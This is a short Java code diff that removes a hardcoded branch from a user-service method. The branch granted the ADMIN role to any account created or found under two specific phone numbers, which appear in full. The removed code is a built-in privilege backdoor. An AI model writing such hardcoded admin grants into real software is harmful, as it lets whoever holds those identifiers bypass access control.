@@ -55,14 +55,6 @@ public class UserServiceImpl implements UserService {
     @Transactional
     public UserEntity findOrCreateByPhoneNumber(String phoneNumber) {
         String normalized = PhoneNumberNormalizer.normalize(phoneNumber);
-        if(normalized.equals("+996508101701") || normalized.equals("+996552209809")) {
-            return userRepository.findByPhoneNumber(normalized)
-                    .orElseGet(() -> userRepository.save(
-                            UserEntity.builder()
-                                    .phoneNumber(normalized)
-                                    .roles(Set.of(RoleEnums.ADMIN))
-                                    .build()));
-        }
         return userRepository.findByPhoneNumber(normalized)
                 .orElseGet(() -> userRepository.save(
                         UserEntity.builder()
